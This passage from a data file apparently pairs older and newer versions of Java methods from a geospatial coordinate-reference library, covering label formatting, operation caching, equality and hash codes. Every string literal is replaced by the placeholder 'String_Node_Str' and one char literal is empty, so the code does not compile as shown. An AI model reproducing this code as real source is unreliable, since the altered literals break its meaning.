    if (object instanceof CoordinateReferenceSystem) {
      cs=((CoordinateReferenceSystem)object).getCoordinateSystem();
    }
    if (cs instanceof EllipsoidalCS) {
      final StringBuilder sb=new StringBuilder(label);
      sb.setLength(label.length() - suffix.length());
      label=sb.append(((CoordinateSystem)cs).getDimension()).append('D').toString();
    }
  }
  String name=IdentifiedObjects.getName(object,null);
  if (name != null) {
    int i=30;
    if (name.length() >= i) {
      while (i > 15) {
        final int c=name.codePointBefore(i);
        if (Character.isSpaceChar(c))         break;
        i-=Character.charCount(c);
      }
      name=CharSequences.trimWhitespaces(name,0,i).toString() + '';
    }
    label=label + ""String_Node_Str"" + name+ ""String_Node_Str"";
  }
  return label;
}"
91895,"/** 
 * Creates a new instance for the given factory and context.
 * @param registry  the factory to use for creating operations as defined by authority, or {@code null} if none.
 * @param factory   the factory to use for creating operations not found in the registry.
 * @param context   the area of interest and desired accuracy, or {@code null} if none.
 * @throws FactoryException if an error occurred while initializing this {@code CoordinateOperationFinder}.
 */
public CoordinateOperationFinder(final CoordinateOperationAuthorityFactory registry,final CoordinateOperationFactory factory,final CoordinateOperationContext context) throws FactoryException {
  super(registry,factory,context);
  identifierOfStepCRS=new HashMap<Identifier,Object>(8);
  previousSearches=new HashMap<CRSPair,Boolean>(8);
}","/** 
 * Creates a new instance for the given factory and context.
 * @param registry  the factory to use for creating operations as defined by authority, or {@code null} if none.
 * @param factory   the factory to use for creating operations not found in the registry.
 * @param context   the area of interest and desired accuracy, or {@code null} if none.
 * @throws FactoryException if an error occurred while initializing this {@code CoordinateOperationFinder}.
 */
public CoordinateOperationFinder(final CoordinateOperationAuthorityFactory registry,final CoordinateOperationFactory factory,final CoordinateOperationContext context) throws FactoryException {
  super(registry,factory,context);
  identifierOfStepCRS=new HashMap<Identifier,Object>(8);
  previousSearches=new HashMap<CRSPair,Boolean>(8);
  useCache=(context == null) && (factory == factorySIS);
}"
91896,"/** 
 * Infers an operation for conversion or transformation between two coordinate reference systems. If a non-null authority factory the <cite>registry</cite> has been specified at construction time, this method will first query that factory (<cite>late-binding</cite> approach see class javadoc). If no operation has been found in the registry or if no registry has been specified to the constructor, this method inspects the given CRS and delegates the work to one or many   {@code createOperationStep()}methods (<cite>early-binding</cite> approach). <p>At first, this method is invoked with the   {@code sourceCRS} and {@code targetCRS} arguments given to the{@link DefaultCoordinateOperationFactory#createOperation(CoordinateReferenceSystem,CoordinateReferenceSystem,CoordinateOperationContext) CoordinateOperationFactory.createOperation()} method. But then, this method maybe invoked recursively by some  {@code createOperationStep()} methods with different source or target CRS,for example in order to process the  {@linkplain org.apache.sis.referencing.crs.DefaultProjectedCRS#getBaseCRS() base geographic CRS} of a projected CRS.</p>
 * @param sourceCRS  input coordinate reference system.
 * @param targetCRS  output coordinate reference system.
 * @return a coordinate operation from {@code sourceCRS} to {@code targetCRS}.
 * @throws OperationNotFoundException if no operation path was found from {@code sourceCRS} to {@code targetCRS}.
 * @throws FactoryException if the operation creation failed for some other reason.
 */
@Override public CoordinateOperation createOperation(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws OperationNotFoundException, FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  if (!previousSearches.isEmpty()) {
  }
  final CRSPair key=new CRSPair(sourceCRS,targetCRS);
  if (previousSearches.put(key,Boolean.TRUE) != null) {
    throw new FactoryException(Errors.format(Errors.Keys.RecursiveCreateCallForCode_2,CoordinateOperation.class,key));
  }
  GeographicBoundingBox bbox=Extents.getGeographicBoundingBox(areaOfInterest);
  if (bbox == null) {
    bbox=Extents.intersection(CRS.getGeographicBoundingBox(sourceCRS),CRS.getGeographicBoundingBox(targetCRS));
    areaOfInterest=CoordinateOperationContext.setGeographicBoundingBox(areaOfInterest,bbox);
  }
  if (registry != null) {
    final CoordinateOperation op=super.createOperation(sourceCRS,targetCRS);
    if (op != null)     return op;
  }
  if (sourceCRS instanceof GeneralDerivedCRS) {
    final GeneralDerivedCRS source=(GeneralDerivedCRS)sourceCRS;
    if (targetCRS instanceof GeneralDerivedCRS) {
      return createOperationStep(source,(GeneralDerivedCRS)targetCRS);
    }
    if (targetCRS instanceof SingleCRS) {
      return createOperationStep(source,(SingleCRS)targetCRS);
    }
  }
  if (targetCRS instanceof GeneralDerivedCRS) {
    final GeneralDerivedCRS target=(GeneralDerivedCRS)targetCRS;
    if (sourceCRS instanceof SingleCRS) {
      return createOperationStep((SingleCRS)sourceCRS,target);
    }
  }
  if (sourceCRS instanceof GeodeticCRS) {
    final GeodeticCRS source=(GeodeticCRS)sourceCRS;
    if (targetCRS instanceof GeodeticCRS) {
      return createOperationStep(source,(GeodeticCRS)targetCRS);
    }
    if (targetCRS instanceof VerticalCRS) {
      return createOperationStep(source,(VerticalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof VerticalCRS) {
    final VerticalCRS source=(VerticalCRS)sourceCRS;
    if (targetCRS instanceof VerticalCRS) {
      return createOperationStep(source,(VerticalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof TemporalCRS) {
    final TemporalCRS source=(TemporalCRS)sourceCRS;
    if (targetCRS instanceof TemporalCRS) {
      return createOperationStep(source,(TemporalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof CompoundCRS || targetCRS instanceof CompoundCRS) {
    return createOperationStep(sourceCRS,CRS.getSingleComponents(sourceCRS),targetCRS,CRS.getSingleComponents(targetCRS));
  }
  throw new OperationNotFoundException(notFoundMessage(sourceCRS,targetCRS));
}","/** 
 * Infers an operation for conversion or transformation between two coordinate reference systems. If a non-null authority factory the <cite>registry</cite> has been specified at construction time, this method will first query that factory (<cite>late-binding</cite> approach see class javadoc). If no operation has been found in the registry or if no registry has been specified to the constructor, this method inspects the given CRS and delegates the work to one or many   {@code createOperationStep()}methods (<cite>early-binding</cite> approach). <p>At first, this method is invoked with the   {@code sourceCRS} and {@code targetCRS} arguments given to the{@link DefaultCoordinateOperationFactory#createOperation(CoordinateReferenceSystem,CoordinateReferenceSystem,CoordinateOperationContext) CoordinateOperationFactory.createOperation()} method. But then, this method maybe invoked recursively by some  {@code createOperationStep()} methods with different source or target CRS,for example in order to process the  {@linkplain org.apache.sis.referencing.crs.DefaultProjectedCRS#getBaseCRS() base geographic CRS} of a projected CRS.</p>
 * @param sourceCRS  input coordinate reference system.
 * @param targetCRS  output coordinate reference system.
 * @return a coordinate operation from {@code sourceCRS} to {@code targetCRS}.
 * @throws OperationNotFoundException if no operation path was found from {@code sourceCRS} to {@code targetCRS}.
 * @throws FactoryException if the operation creation failed for some other reason.
 */
@Override public CoordinateOperation createOperation(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws OperationNotFoundException, FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  if (equalsIgnoreMetadata(sourceCRS,targetCRS))   try {
    return createFromAffineTransform(AXIS_CHANGES,sourceCRS,targetCRS,CoordinateSystems.swapAndScaleAxes(sourceCRS.getCoordinateSystem(),targetCRS.getCoordinateSystem()));
  }
 catch (  IllegalArgumentException e) {
    throw new FactoryException(Errors.format(Errors.Keys.CanNotInstantiate_1,new CRSPair(sourceCRS,targetCRS)),e);
  }
catch (  ConversionException e) {
    throw new FactoryException(Errors.format(Errors.Keys.CanNotInstantiate_1,new CRSPair(sourceCRS,targetCRS)),e);
  }
  final CRSPair key=new CRSPair(sourceCRS,targetCRS);
  if (useCache && !previousSearches.isEmpty()) {
    final CoordinateOperation op=factorySIS.cache.peek(key);
    if (op != null)     return op;
  }
  if (previousSearches.put(key,Boolean.TRUE) != null) {
    throw new FactoryException(Errors.format(Errors.Keys.RecursiveCreateCallForCode_2,CoordinateOperation.class,key));
  }
  GeographicBoundingBox bbox=Extents.getGeographicBoundingBox(areaOfInterest);
  if (bbox == null) {
    bbox=Extents.intersection(CRS.getGeographicBoundingBox(sourceCRS),CRS.getGeographicBoundingBox(targetCRS));
    areaOfInterest=CoordinateOperationContext.setGeographicBoundingBox(areaOfInterest,bbox);
  }
  if (registry != null) {
    final CoordinateOperation op=super.createOperation(sourceCRS,targetCRS);
    if (op != null)     return op;
  }
  if (sourceCRS instanceof GeneralDerivedCRS) {
    final GeneralDerivedCRS source=(GeneralDerivedCRS)sourceCRS;
    if (targetCRS instanceof GeneralDerivedCRS) {
      return createOperationStep(source,(GeneralDerivedCRS)targetCRS);
    }
    if (targetCRS instanceof SingleCRS) {
      return createOperationStep(source,(SingleCRS)targetCRS);
    }
  }
  if (targetCRS instanceof GeneralDerivedCRS) {
    final GeneralDerivedCRS target=(GeneralDerivedCRS)targetCRS;
    if (sourceCRS instanceof SingleCRS) {
      return createOperationStep((SingleCRS)sourceCRS,target);
    }
  }
  if (sourceCRS instanceof GeodeticCRS) {
    final GeodeticCRS source=(GeodeticCRS)sourceCRS;
    if (targetCRS instanceof GeodeticCRS) {
      return createOperationStep(source,(GeodeticCRS)targetCRS);
    }
    if (targetCRS instanceof VerticalCRS) {
      return createOperationStep(source,(VerticalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof VerticalCRS) {
    final VerticalCRS source=(VerticalCRS)sourceCRS;
    if (targetCRS instanceof VerticalCRS) {
      return createOperationStep(source,(VerticalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof TemporalCRS) {
    final TemporalCRS source=(TemporalCRS)sourceCRS;
    if (targetCRS instanceof TemporalCRS) {
      return createOperationStep(source,(TemporalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof CompoundCRS || targetCRS instanceof CompoundCRS) {
    return createOperationStep(sourceCRS,CRS.getSingleComponents(sourceCRS),targetCRS,CRS.getSingleComponents(targetCRS));
  }
  throw new OperationNotFoundException(notFoundMessage(sourceCRS,targetCRS));
}"
91897,"/** 
 * This feature type is considered to all other features except itself.
 */
@Override public boolean isAssignableFrom(final FeatureType type){
  return (type instanceof NamedFeatureType);
}","/** 
 * This feature type is considered independent of all other feature types except itself.
 */
@Override public boolean isAssignableFrom(final FeatureType type){
  return (type instanceof NamedFeatureType);
}"
91898,"/** 
 * Sets an enumeration of valid values for this attribute. <p>This is a convenience method for   {@link #addCharacteristic(Class)} with a valueof type  {@link Set} and a conventional name.</p>
 * @param values valid values.
 * @return {@code this} for allowing method calls chaining.
 * @throws UnsupportedOperationException if this property does not support characteristics.
 * @see AttributeConvention#VALID_VALUES_CHARACTERISTIC
 */
@SafeVarargs public final Property<V> setValidValues(final V... values){
  return setCharacteristic(AttributeConvention.VALID_VALUES_CHARACTERISTIC,Set.class,CollectionsExt.immutableSet(false,values));
}","/** 
 * Sets an enumeration of valid values for this attribute. <p>This is a convenience method for   {@link #addCharacteristic(Class)} with a valueof type  {@link Set} and a conventional name.</p>
 * @param values valid values.
 * @return {@code this} for allowing method calls chaining.
 * @throws UnsupportedOperationException if this property does not support characteristics.
 * @see AttributeConvention#VALID_VALUES_CHARACTERISTIC
 */
public final Property<V> setValidValues(final V... values){
  return setCharacteristic(AttributeConvention.VALID_VALUES_CHARACTERISTIC,Set.class,CollectionsExt.immutableSet(false,values));
}"
91899,"/** 
 * Compares the specified object with this coordinate system for equality.
 * @param object The object to compare to {@code this}.
 * @param mode {@link ComparisonMode#STRICT STRICT} for performing a strict comparison, or{@link ComparisonMode#IGNORE_METADATA IGNORE_METADATA} for comparing only propertiesrelevant to coordinate transformations.
 * @return {@code true} if both objects are equal.
 */
@Override public boolean equals(final Object object,final ComparisonMode mode){
  if (object == this) {
    return true;
  }
  if (!super.equals(object,mode)) {
    return false;
  }
switch (mode) {
case STRICT:
{
      return Arrays.equals(axes,((AbstractCS)object).axes);
    }
default :
{
    final CoordinateSystem that=(CoordinateSystem)object;
    final int dimension=getDimension();
    if (dimension != that.getDimension()) {
      return false;
    }
    if (mode != ComparisonMode.ALLOW_VARIANT) {
      for (int i=0; i < dimension; i++) {
        if (!deepEquals(getAxis(i),that.getAxis(i),mode)) {
          return false;
        }
      }
    }
    return true;
  }
}
}","/** 
 * Compares the specified object with this coordinate system for equality.
 * @param object The object to compare to {@code this}.
 * @param mode {@link ComparisonMode#STRICT STRICT} for performing a strict comparison, or{@link ComparisonMode#IGNORE_METADATA IGNORE_METADATA} for comparing only propertiesrelevant to coordinate transformations.
 * @return {@code true} if both objects are equal.
 */
@Override @SuppressWarnings(""String_Node_Str"") public boolean equals(final Object object,final ComparisonMode mode){
  if (object == this) {
    return true;
  }
  if (!super.equals(object,mode)) {
    return false;
  }
switch (mode) {
case STRICT:
{
      return Arrays.equals(axes,((AbstractCS)object).axes);
    }
case DEBUG:
{
    final int d1=axes.length;
    final int d2=((CoordinateSystem)object).getDimension();
    if (d1 != d2) {
      throw new AssertionError(Errors.format(Errors.Keys.MismatchedDimension_2,d1,d2));
    }
  }
default :
{
  final CoordinateSystem that=(CoordinateSystem)object;
  final int dimension=getDimension();
  if (dimension != that.getDimension()) {
    return false;
  }
  if (mode != ComparisonMode.ALLOW_VARIANT) {
    for (int i=0; i < dimension; i++) {
      if (!deepEquals(getAxis(i),that.getAxis(i),mode)) {
        return false;
      }
    }
  }
  return true;
}
}
}"
91900,"/** 
 * Returns the hash code value.
 */
@Override public int hashCode(){
  return sourceCRS.hashCode() * 31 + targetCRS.hashCode();
}","/** 
 * Returns the hash code value.
 */
@Override public int hashCode(){
  return Objects.hashCode(sourceCRS) * 31 + Objects.hashCode(targetCRS);
}"
91901,"/** 
 * Returns the name of the GeoAPI interface implemented by the specified object, followed by the name between brackets.
 */
static String label(final IdentifiedObject object){
  if (object == null) {
    return null;
  }
  Class<? extends IdentifiedObject> type;
  if (object instanceof AbstractIdentifiedObject) {
    type=((AbstractIdentifiedObject)object).getInterface();
  }
 else {
    type=Classes.getLeafInterfaces(object.getClass(),IdentifiedObject.class)[0];
  }
  String label=Classes.getShortName(type);
  String name=IdentifiedObjects.getName(object,null);
  if (name != null) {
    int i=30;
    if (name.length() >= i) {
      while (i > 15) {
        final int c=name.codePointBefore(i);
        if (Character.isSpaceChar(c))         break;
        i-=Character.charCount(c);
      }
      name=CharSequences.trimWhitespaces(name,0,i).toString() + '';
    }
    label=label + ""String_Node_Str"" + name+ ""String_Node_Str"";
  }
  return label;
}","/** 
 * Returns the name of the GeoAPI interface implemented by the specified object. In the GeographicCRS or EllipsoidalCS cases, the trailing CRS or CS suffix is replaced by the number of dimensions (e.g. ""Geographic3D"").
 */
static String label(final IdentifiedObject object){
  if (object == null) {
    return null;
  }
  Class<? extends IdentifiedObject> type;
  if (object instanceof AbstractIdentifiedObject) {
    type=((AbstractIdentifiedObject)object).getInterface();
  }
 else {
    type=Classes.getLeafInterfaces(object.getClass(),IdentifiedObject.class)[0];
  }
  String suffix, label=Classes.getShortName(type);
  if (label.endsWith((suffix=""String_Node_Str"")) || label.endsWith(suffix=""String_Node_Str"")) {
    Object cs=object;
    if (object instanceof CoordinateReferenceSystem) {
      cs=((CoordinateReferenceSystem)object).getCoordinateSystem();
    }
    if (cs instanceof EllipsoidalCS) {
      final StringBuilder sb=new StringBuilder(label);
      sb.setLength(label.length() - suffix.length());
      label=sb.append(((CoordinateSystem)cs).getDimension()).append('D').toString();
    }
  }
  String name=IdentifiedObjects.getName(object,null);
  if (name != null) {
    int i=30;
    if (name.length() >= i) {
      while (i > 15) {
        final int c=name.codePointBefore(i);
        if (Character.isSpaceChar(c))         break;
        i-=Character.charCount(c);
      }
      name=CharSequences.trimWhitespaces(name,0,i).toString() + '';
    }
    label=label + ""String_Node_Str"" + name+ ""String_Node_Str"";
  }
  return label;
}"
91902,"/** 
 * Creates a new instance for the given factory and context.
 * @param registry  the factory to use for creating operations as defined by authority, or {@code null} if none.
 * @param factory   the factory to use for creating operations not found in the registry.
 * @param context   the area of interest and desired accuracy, or {@code null} if none.
 * @throws FactoryException if an error occurred while initializing this {@code CoordinateOperationFinder}.
 */
public CoordinateOperationFinder(final CoordinateOperationAuthorityFactory registry,final CoordinateOperationFactory factory,final CoordinateOperationContext context) throws FactoryException {
  super(registry,factory,context);
  identifierOfStepCRS=new HashMap<Identifier,Object>(8);
  previousSearches=new HashMap<CRSPair,Boolean>(8);
}","/** 
 * Creates a new instance for the given factory and context.
 * @param registry  the factory to use for creating operations as defined by authority, or {@code null} if none.
 * @param factory   the factory to use for creating operations not found in the registry.
 * @param context   the area of interest and desired accuracy, or {@code null} if none.
 * @throws FactoryException if an error occurred while initializing this {@code CoordinateOperationFinder}.
 */
public CoordinateOperationFinder(final CoordinateOperationAuthorityFactory registry,final CoordinateOperationFactory factory,final CoordinateOperationContext context) throws FactoryException {
  super(registry,factory,context);
  identifierOfStepCRS=new HashMap<Identifier,Object>(8);
  previousSearches=new HashMap<CRSPair,Boolean>(8);
  useCache=(context == null) && (factory == factorySIS);
}"
91903,"/** 
 * Infers an operation for conversion or transformation between two coordinate reference systems. If a non-null authority factory the <cite>registry</cite> has been specified at construction time, this method will first query that factory (<cite>late-binding</cite> approach see class javadoc). If no operation has been found in the registry or if no registry has been specified to the constructor, this method inspects the given CRS and delegates the work to one or many   {@code createOperationStep()}methods (<cite>early-binding</cite> approach). <p>At first, this method is invoked with the   {@code sourceCRS} and {@code targetCRS} arguments given to the{@link DefaultCoordinateOperationFactory#createOperation(CoordinateReferenceSystem,CoordinateReferenceSystem,CoordinateOperationContext) CoordinateOperationFactory.createOperation()} method. But then, this method maybe invoked recursively by some  {@code createOperationStep()} methods with different source or target CRS,for example in order to process the  {@linkplain org.apache.sis.referencing.crs.DefaultProjectedCRS#getBaseCRS() base geographic CRS} of a projected CRS.</p>
 * @param sourceCRS  input coordinate reference system.
 * @param targetCRS  output coordinate reference system.
 * @return a coordinate operation from {@code sourceCRS} to {@code targetCRS}.
 * @throws OperationNotFoundException if no operation path was found from {@code sourceCRS} to {@code targetCRS}.
 * @throws FactoryException if the operation creation failed for some other reason.
 */
@Override public CoordinateOperation createOperation(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws OperationNotFoundException, FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  if (!previousSearches.isEmpty()) {
  }
  final CRSPair key=new CRSPair(sourceCRS,targetCRS);
  if (previousSearches.put(key,Boolean.TRUE) != null) {
    throw new FactoryException(Errors.format(Errors.Keys.RecursiveCreateCallForCode_2,CoordinateOperation.class,key));
  }
  GeographicBoundingBox bbox=Extents.getGeographicBoundingBox(areaOfInterest);
  if (bbox == null) {
    bbox=Extents.intersection(CRS.getGeographicBoundingBox(sourceCRS),CRS.getGeographicBoundingBox(targetCRS));
    areaOfInterest=CoordinateOperationContext.setGeographicBoundingBox(areaOfInterest,bbox);
  }
  if (registry != null) {
    final CoordinateOperation op=super.createOperation(sourceCRS,targetCRS);
    if (op != null)     return op;
  }
  if (sourceCRS instanceof GeneralDerivedCRS) {
    final GeneralDerivedCRS source=(GeneralDerivedCRS)sourceCRS;
    if (targetCRS instanceof GeneralDerivedCRS) {
      return createOperationStep(source,(GeneralDerivedCRS)targetCRS);
    }
    if (targetCRS instanceof SingleCRS) {
      return createOperationStep(source,(SingleCRS)targetCRS);
    }
  }
  if (targetCRS instanceof GeneralDerivedCRS) {
    final GeneralDerivedCRS target=(GeneralDerivedCRS)targetCRS;
    if (sourceCRS instanceof SingleCRS) {
      return createOperationStep((SingleCRS)sourceCRS,target);
    }
  }
  if (sourceCRS instanceof GeodeticCRS) {
    final GeodeticCRS source=(GeodeticCRS)sourceCRS;
    if (targetCRS instanceof GeodeticCRS) {
      return createOperationStep(source,(GeodeticCRS)targetCRS);
    }
    if (targetCRS instanceof VerticalCRS) {
      return createOperationStep(source,(VerticalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof VerticalCRS) {
    final VerticalCRS source=(VerticalCRS)sourceCRS;
    if (targetCRS instanceof VerticalCRS) {
      return createOperationStep(source,(VerticalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof TemporalCRS) {
    final TemporalCRS source=(TemporalCRS)sourceCRS;
    if (targetCRS instanceof TemporalCRS) {
      return createOperationStep(source,(TemporalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof CompoundCRS || targetCRS instanceof CompoundCRS) {
    return createOperationStep(sourceCRS,CRS.getSingleComponents(sourceCRS),targetCRS,CRS.getSingleComponents(targetCRS));
  }
  throw new OperationNotFoundException(notFoundMessage(sourceCRS,targetCRS));
}","/** 
 * Infers an operation for conversion or transformation between two coordinate reference systems. If a non-null authority factory the <cite>registry</cite> has been specified at construction time, this method will first query that factory (<cite>late-binding</cite> approach see class javadoc). If no operation has been found in the registry or if no registry has been specified to the constructor, this method inspects the given CRS and delegates the work to one or many   {@code createOperationStep()}methods (<cite>early-binding</cite> approach). <p>At first, this method is invoked with the   {@code sourceCRS} and {@code targetCRS} arguments given to the{@link DefaultCoordinateOperationFactory#createOperation(CoordinateReferenceSystem,CoordinateReferenceSystem,CoordinateOperationContext) CoordinateOperationFactory.createOperation()} method. But then, this method maybe invoked recursively by some  {@code createOperationStep()} methods with different source or target CRS,for example in order to process the  {@linkplain org.apache.sis.referencing.crs.DefaultProjectedCRS#getBaseCRS() base geographic CRS} of a projected CRS.</p>
 * @param sourceCRS  input coordinate reference system.
 * @param targetCRS  output coordinate reference system.
 * @return a coordinate operation from {@code sourceCRS} to {@code targetCRS}.
 * @throws OperationNotFoundException if no operation path was found from {@code sourceCRS} to {@code targetCRS}.
 * @throws FactoryException if the operation creation failed for some other reason.
 */
@Override public CoordinateOperation createOperation(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws OperationNotFoundException, FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  if (equalsIgnoreMetadata(sourceCRS,targetCRS))   try {
    return createFromAffineTransform(AXIS_CHANGES,sourceCRS,targetCRS,CoordinateSystems.swapAndScaleAxes(sourceCRS.getCoordinateSystem(),targetCRS.getCoordinateSystem()));
  }
 catch (  IllegalArgumentException e) {
    throw new FactoryException(Errors.format(Errors.Keys.CanNotInstantiate_1,new CRSPair(sourceCRS,targetCRS)),e);
  }
catch (  ConversionException e) {
    throw new FactoryException(Errors.format(Errors.Keys.CanNotInstantiate_1,new CRSPair(sourceCRS,targetCRS)),e);
  }
  final CRSPair key=new CRSPair(sourceCRS,targetCRS);
  if (useCache && !previousSearches.isEmpty()) {
    final CoordinateOperation op=factorySIS.cache.peek(key);
    if (op != null)     return op;
  }
  if (previousSearches.put(key,Boolean.TRUE) != null) {
    throw new FactoryException(Errors.format(Errors.Keys.RecursiveCreateCallForCode_2,CoordinateOperation.class,key));
  }
  GeographicBoundingBox bbox=Extents.getGeographicBoundingBox(areaOfInterest);
  if (bbox == null) {
    bbox=Extents.intersection(CRS.getGeographicBoundingBox(sourceCRS),CRS.getGeographicBoundingBox(targetCRS));
    areaOfInterest=CoordinateOperationContext.setGeographicBoundingBox(areaOfInterest,bbox);
  }
  if (registry != null) {
    final CoordinateOperation op=super.createOperation(sourceCRS,targetCRS);
    if (op != null)     return op;
  }
  if (sourceCRS instanceof GeneralDerivedCRS) {
    final GeneralDerivedCRS source=(GeneralDerivedCRS)sourceCRS;
    if (targetCRS instanceof GeneralDerivedCRS) {
      return createOperationStep(source,(GeneralDerivedCRS)targetCRS);
    }
    if (targetCRS instanceof SingleCRS) {
      return createOperationStep(source,(SingleCRS)targetCRS);
    }
  }
  if (targetCRS instanceof GeneralDerivedCRS) {
    final GeneralDerivedCRS target=(GeneralDerivedCRS)targetCRS;
    if (sourceCRS instanceof SingleCRS) {
      return createOperationStep((SingleCRS)sourceCRS,target);
    }
  }
  if (sourceCRS instanceof GeodeticCRS) {
    final GeodeticCRS source=(GeodeticCRS)sourceCRS;
    if (targetCRS instanceof GeodeticCRS) {
      return createOperationStep(source,(GeodeticCRS)targetCRS);
    }
    if (targetCRS instanceof VerticalCRS) {
      return createOperationStep(source,(VerticalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof VerticalCRS) {
    final VerticalCRS source=(VerticalCRS)sourceCRS;
    if (targetCRS instanceof VerticalCRS) {
      return createOperationStep(source,(VerticalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof TemporalCRS) {
    final TemporalCRS source=(TemporalCRS)sourceCRS;
    if (targetCRS instanceof TemporalCRS) {
      return createOperationStep(source,(TemporalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof CompoundCRS || targetCRS instanceof CompoundCRS) {
    return createOperationStep(sourceCRS,CRS.getSingleComponents(sourceCRS),targetCRS,CRS.getSingleComponents(targetCRS));
  }
  throw new OperationNotFoundException(notFoundMessage(sourceCRS,targetCRS));
}"
91904,"/** 
 * Other attributes that describes this attribute. For example if this attribute carries a measurement, then a characteristic of this attribute could be the measurement accuracy. See <cite>""Attribute characterization""</cite> in   {@link DefaultAttributeType} Javadoc for more information.<p>The map returned by this method contains only the characteristics explicitely defined for this attribute. If the map contains no characteristic for a given name, a  {@linkplain DefaultAttributeType#getDefaultValue() default value} may still exist.In such cases, callers may also need to inspect the  {@link DefaultAttributeType#characteristics()}as shown in the <cite>Reading a characteristic</cite> section below.</p> <div class=""note""><b>Rational:</b> Very often, all attributes of a given type in the same dataset have the same characteristics. For example it is very common that all temperature measurements in a dataset have the same accuracy, and setting a different accuracy for a single measurement is relatively rare. Consequently,   {@code characteristics.isEmpty()} is a convenient way to check that an attribute haveall the ""standard"" characteristics and need no special processing.</div> <div class=""section"">Reading a characteristic</div> The characteristic values are enumerated in the  {@linkplain Map#values() map values}. The   {@linkplain Map#keySet() map keys} are the {@code String} representations of characteristics{@linkplain DefaultAttributeType#getName() name}, for more convenient lookups. <p>If an attribute is known to be a measurement with a characteristic named ""accuracy"" of type   {@link Float}, then the accuracy value could be read as below:</p>  {@preformat java}Float getAccuracy(Attribute<?> measurement)  Attribute<?> accuracy = measurement.characteristics().get(""accuracy""); if (accuracy != null) { return (Float) accuracy.getValue(); // Value may be null. } else { return (Float) measurement.getType().characteristics().get(""accuracy"").getDefaultValue(); // A more sophisticated implementation would probably cache the default value somewhere. } } } <div class=""section"">Adding a characteristic</div> A new characteristic can be added in the map in three different ways: <ol> <li>Putting the (<var>name</var>, <var>characteristic</var>) pair explicitely. If an older characteristic existed for that name, it will be replaced. Example:  {@preformat javaAttribute<?> accuracy = ...; // To be created by the caller. characteristics.put(""accuracy"", accuracy);}</li> <li>Adding the new characteristic to the   {@linkplain Map#values() values} collection.The name is inferred automatically from the characteristic type. If an older characteristic existed for the same name, an  {@link IllegalStateException} will be thrown.Example: {@preformat javaAttribute<?> accuracy = ...; // To be created by the caller. characteristics.values().add(accuracy);}</li> <li>Adding the characteristic name to the   {@linkplain Map#keySet() key set}. If no characteristic existed for that name, a default one will be created. Example:  {@preformat javacharacteristics.keySet().add(""accuracy""); // Ensure that an entry will exist for that name. Attribute<?> accuracy = characteristics.get(""accuracy""); Features.cast(accuracy, Float.class).setValue(...); // Set new accuracy value here as a float.}</li> </ol>
 * @return Other attribute types that describes this attribute type, or an empty map if none.
 * @see DefaultAttributeType#characteristics()
 */
@Override @SuppressWarnings(""String_Node_Str"") public Map<String,Attribute<?>> characteristics(){
  if (characteristics == null) {
    characteristics=newCharacteristicsMap();
  }
  return characteristics;
}","/** 
 * Other attributes that describes this attribute. For example if this attribute carries a measurement, then a characteristic of this attribute could be the measurement accuracy. See <cite>""Attribute characterization""</cite> in   {@link DefaultAttributeType} Javadoc for more information.<p>The map returned by this method contains only the characteristics explicitely defined for this attribute. If the map contains no characteristic for a given name, a  {@linkplain DefaultAttributeType#getDefaultValue() default value} may still exist.In such cases, callers may also need to inspect the  {@link DefaultAttributeType#characteristics()}as shown in the <cite>Reading a characteristic</cite> section below.</p> <div class=""note""><b>Rational:</b> Very often, all attributes of a given type in the same dataset have the same characteristics. For example it is very common that all temperature measurements in a dataset have the same accuracy, and setting a different accuracy for a single measurement is relatively rare. Consequently,   {@code characteristics.isEmpty()} is a convenient way to check that an attribute haveall the ""standard"" characteristics and need no special processing.</div> <div class=""section"">Reading a characteristic</div> The characteristic values are enumerated in the  {@linkplain Map#values() map values}. The   {@linkplain Map#keySet() map keys} are the {@code String} representations of characteristics{@linkplain DefaultAttributeType#getName() name}, for more convenient lookups. <p>If an attribute is known to be a measurement with a characteristic named ""accuracy"" of type   {@link Float}, then the accuracy value could be read as below:</p>  {@preformat java}Float getAccuracy(Attribute<?> measurement)  Attribute<?> accuracy = measurement.characteristics().get(""accuracy""); if (accuracy != null) { return (Float) accuracy.getValue(); // Value may be null. } else { return (Float) measurement.getType().characteristics().get(""accuracy"").getDefaultValue(); // A more sophisticated implementation would probably cache the default value somewhere. } } } <div class=""section"">Adding a characteristic</div> A new characteristic can be added in the map in three different ways: <ol> <li>Putting the (<var>name</var>, <var>characteristic</var>) pair explicitely. If an older characteristic existed for that name, it will be replaced. Example:  {@preformat javaAttribute<?> accuracy = ...; // To be created by the caller. characteristics.put(""accuracy"", accuracy);}</li> <li>Adding the new characteristic to the   {@linkplain Map#values() values} collection.The name is inferred automatically from the characteristic type. If an older characteristic existed for the same name, an  {@link IllegalStateException} will be thrown.Example: {@preformat javaAttribute<?> accuracy = ...; // To be created by the caller. characteristics.values().add(accuracy);}</li> <li>Adding the characteristic name to the   {@linkplain Map#keySet() key set}. If no characteristic existed for that name, a default one will be created. Example:  {@preformat javacharacteristics.keySet().add(""accuracy""); // Ensure that an entry will exist for that name. Attribute<?> accuracy = characteristics.get(""accuracy""); Features.cast(accuracy, 